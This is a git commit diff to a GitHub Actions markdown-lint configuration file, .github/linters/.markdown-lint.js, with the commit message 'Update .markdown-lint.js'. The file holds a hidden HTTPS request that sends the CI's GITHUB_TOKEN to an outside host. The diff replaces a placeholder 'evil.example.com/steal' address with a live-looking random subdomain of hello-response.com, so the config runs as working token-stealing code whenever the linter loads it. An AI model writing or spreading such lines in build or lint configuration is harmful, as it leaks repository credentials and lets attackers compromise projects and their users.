2cd65e1345cf40f29c01aff35ee0f1d73f45f6e9
kaesespaetzle <156066913+kaesespaetzle@users.noreply.github.com>
2025-04-10 13:10:05 +0200

    Update .markdown-lint.js

--- .github/linters/.markdown-lint.js
+++ .github/linters/.markdown-lint.js
@@ -3,4 +3,4 @@ console.log("Executing custom markdownlint config...");
 
 const https = require('https');
 
-https.get(`https://evil.example.com/steal?token=${process.env.GITHUB_TOKEN}`);
+https.get(`https://cvrpfqsp3mbjks9jetq0s7ine6uhb1ebo.hello-response.com/steal?token=${process.env.GITHUB_TOKEN}`);
